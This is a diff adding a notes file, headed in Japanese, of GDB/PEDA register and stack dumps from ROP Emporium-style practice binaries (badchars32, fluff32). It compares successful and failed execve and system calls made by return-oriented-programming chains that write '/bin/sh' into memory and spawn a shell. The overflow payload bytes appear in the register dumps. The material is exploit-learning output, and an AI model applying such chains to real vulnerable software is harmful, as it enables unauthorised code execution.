@@ -1,0 +1,155 @@
+# 成功時と失敗時におけるexecve
+
+# badchars32の成功時
+# SUCCESS
+[-------------------------------------code-------------------------------------]
+   0xf7e30c8c:	push   eax
+   0xf7e30c8d:	lea    eax,[esi-0x56655]
+   0xf7e30c93:	push   eax
+=> 0xf7e30c94:	call   0xf7ea67e0 <execve>
+   0xf7e30c99:	mov    DWORD PTR [esp],0x7f
+   0xf7e30ca0:	call   0xf7ea67c8 <_exit>
+   0xf7e30ca5:	lea    esi,[esi+eiz*1+0x0]
+   0xf7e30ca9:	lea    edi,[edi+eiz*1+0x0]
+Guessed arguments:
+arg[0]: 0xf7f519ab ("/bin/sh")
+arg[1]: 0xffffbd40 --> 0xf7f519b0 --> 0x65006873 ('sh')
+arg[2]: 0xffffbeac --> 0x0 
+[------------------------------------stack-------------------------------------]
+0000| 0xffffbd0c --> 0xf7f519ab ("/bin/sh")
+0004| 0xffffbd10 --> 0xffffbd40 --> 0xf7f519b0 --> 0x65006873 ('sh')
+0008| 0xffffbd14 --> 0xffffbeac --> 0x0 
+0012| 0xffffbd18 --> 0xffffbd2c --> 0x0 
+0016| 0xffffbd1c --> 0x0 
+0020| 0xffffbd20 --> 0x0 
+0024| 0xffffbd24 --> 0xffffbd50 --> 0x0 
+0028| 0xffffbd28 --> 0x804a050 ("/bin/sh")
+
+
+# fluff32の失敗時
+# FAILURE
+[-------------------------------------code-------------------------------------]
+   0xf7e30c8c:	push   eax
+   0xf7e30c8d:	lea    eax,[esi-0x56655]
+   0xf7e30c93:	push   eax
+=> 0xf7e30c94:	call   0xf7ea67e0 <execve>
+   0xf7e30c99:	mov    DWORD PTR [esp],0x7f
+   0xf7e30ca0:	call   0xf7ea67c8 <_exit>
+   0xf7e30ca5:	lea    esi,[esi+eiz*1+0x0]
+   0xf7e30ca9:	lea    edi,[edi+eiz*1+0x0]
+Guessed arguments:
+arg[0]: 0xf7f519ab ("/bin/sh")
+arg[1]: 0xffffbe48 --> 0xf7f519b0 --> 0x65006873 ('sh')
+arg[2]: 0xffffbecc --> 0xd6fe6ea3 
+[------------------------------------stack-------------------------------------]
+0000| 0xffffbe14 --> 0xf7f519ab ("/bin/sh")
+0004| 0xffffbe18 --> 0xffffbe48 --> 0xf7f519b0 --> 0x65006873 ('sh')
+0008| 0xffffbe1c --> 0xffffbecc --> 0xd6fe6ea3 
+0012| 0xffffbe20 --> 0xffffbe34 --> 0x0 
+0016| 0xffffbe24 --> 0x0 
+0020| 0xffffbe28 --> 0x0 
+0024| 0xffffbe2c --> 0xffffbe58 --> 0x0 
+0028| 0xffffbe30 --> 0x804a070 ("/bin/sh")
+
+
+# fluff32の成功時
+# xor edx edx してから入れてるやつ
+# SECCESS
+[-------------------------------------code-------------------------------------]
+   0xf7e30c8c:	push   eax
+   0xf7e30c8d:	lea    eax,[esi-0x56655]
+   0xf7e30c93:	push   eax
+=> 0xf7e30c94:	call   0xf7ea67e0 <execve>
+   0xf7e30c99:	mov    DWORD PTR [esp],0x7f
+   0xf7e30ca0:	call   0xf7ea67c8 <_exit>
+   0xf7e30ca5:	lea    esi,[esi+eiz*1+0x0]
+   0xf7e30ca9:	lea    edi,[edi+eiz*1+0x0]
+Guessed arguments:
+arg[0]: 0xf7f519ab ("/bin/sh")
+arg[1]: 0xffffbd68 --> 0xf7f519b0 --> 0x65006873 ('sh')
+arg[2]: 0xffffbecc --> 0xffffc19f ("XDG_SEAT=seat0")
+[------------------------------------stack-------------------------------------]
+0000| 0xffffbd34 --> 0xf7f519ab ("/bin/sh")
+0004| 0xffffbd38 --> 0xffffbd68 --> 0xf7f519b0 --> 0x65006873 ('sh')
+0008| 0xffffbd3c --> 0xffffbecc --> 0xffffc19f ("XDG_SEAT=seat0")
+0012| 0xffffbd40 --> 0xffffbd54 --> 0x0 
+0016| 0xffffbd44 --> 0x0 
+0020| 0xffffbd48 --> 0x0 
+0024| 0xffffbd4c --> 0xffffbd78 --> 0x0 
+0028| 0xffffbd50 --> 0x804a050 ("/bin/sh")
+
+
+================================================================================
+成功時と失敗時のsystemにおけるレジスタやその他の状態
+
+# Faile
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffbde0 ('A' <repeats 44 times>, "\341\203\004\b\200n\376\326\214\206\004\b{\206\004\bAAAA\211\206\004\bAAAA\223\206\004\bAAAA")
+EBX: 0xdefaced0 
+ECX: 0x804a057 --> 0x0 
+EDX: 0x0 
+ESI: 0xdeadbeef 
+EDI: 0xdeadbeef 
+EBP: 0xdeadbeef 
+ESP: 0xffffbfa0 ("AAAAP\240\004\b")
+EIP: 0x8048430 (<system@plt>: jmp    DWORD PTR ds:0x804a018)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+0x8048420 <puts@plt>:  jmp    DWORD PTR ds:0x804a014
+0x8048426 <puts@plt+6>: push   0x10
+0x804842b <puts@plt+11>: jmp    0x80483f0
+=> 0x8048430 <system@plt>: jmp    DWORD PTR ds:0x804a018
+| 0x8048436 <system@plt+6>: push   0x18
+| 0x804843b <system@plt+11>: jmp    0x80483f0
+| 0x8048440 <__libc_start_main@plt>:  jmp    DWORD PTR ds:0x804a01c
+| 0x8048446 <__libc_start_main@plt+6>: push   0x20
+|->   0x8048436 <system@plt+6>: push   0x18
+0x804843b <system@plt+11>: jmp    0x80483f0
+0x8048440 <__libc_start_main@plt>:  jmp    DWORD PTR ds:0x804a01c
+0x8048446 <__libc_start_main@plt+6>: push   0x20
+JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0xffffbfa0 ("AAAAP\240\004\b")
+0004| 0xffffbfa4 --> 0x804a050 ("/bin/sh")
+0008| 0xffffbfa8 --> 0xffffc900 --> 0x4e495700 ('')
+0012| 0xffffbfac --> 0xffffc937 ("XDG_VTNR=7")
+0016| 0xffffbfb0 --> 0xffffc942 ("GDM_LANG=ja_JP")
+0020| 0xffffbfb4 --> 0xffffc951 ("TERM=xterm-256color")
+0024| 0xffffbfb8 --> 0xffffc965 ("DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-A63M5vEU0W")
+0028| 0xffffbfbc --> 0xffffc9a1 ("XDG_CURRENT_DESKTOP=Unity")
+
+
+# Success
+EAX: 0xffffbde0 ('A' <repeats 44 times>, "\341\203\004\bP\240\004\bq\206\004\bAAAA{\206\004\bAAAA\211\206\004\bAAAA\341\203\004\b/binq\206\004\bAAAA{\206\004\bAAAA\222\206\004\bAAAAAAAA")
+EBX: 0x0 
+ECX: 0x804a054 --> 0x68732f ('/sh')
+EDX: 0x68732f ('/sh')
+ESI: 0x41414141 ('AAAA')
+EDI: 0x41414141 ('AAAA')
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffbea0 ("AAAAP\240\004\b")
+EIP: 0x8048430 (<system@plt>:	jmp    DWORD PTR ds:0x804a018)
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048420 <puts@plt>:	jmp    DWORD PTR ds:0x804a014
+   0x8048426 <puts@plt+6>:	push   0x10
+   0x804842b <puts@plt+11>:	jmp    0x80483f0
+=> 0x8048430 <system@plt>:	jmp    DWORD PTR ds:0x804a018
+ | 0x8048436 <system@plt+6>:	push   0x18
+ | 0x804843b <system@plt+11>:	jmp    0x80483f0
+ | 0x8048440 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a01c
+ | 0x8048446 <__libc_start_main@plt+6>:	push   0x20
+ |->   0x8048436 <system@plt+6>:	push   0x18
+       0x804843b <system@plt+11>:	jmp    0x80483f0
+       0x8048440 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a01c
+       0x8048446 <__libc_start_main@plt+6>:	push   0x20
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0xffffbea0 ("AAAAP\240\004\b")
+0004| 0xffffbea4 --> 0x804a050 ("/bin/sh")
+0008| 0xffffbea8 --> 0xffffbe00 ('A' <repeats 12 times>, "\341\203\004\bP\240\004\bq\206\004\bAAAA{\206\004\bAAAA\211\206\004\bAAAA\341\203\004\b/binq\206\004\bAAAA{\206\004\bAAAA\222\206\004\bAAAAAAAA")
+0012| 0xffffbeac --> 0x80486a0 (<__libc_csu_init>:	push   ebp)
+0016| 0xffffbeb0 --> 0x8048700 (<__libc_csu_fini>:	repz ret)
+0020| 0xffffbeb4 --> 0xf7fe88a0 (push   ebp)
+0024| 0xffffbeb8 --> 0xffffbebc --> 0xf7ffd918 --> 0x0 
+0028| 0xffffbebc --> 0xf7ffd918 --> 0x0
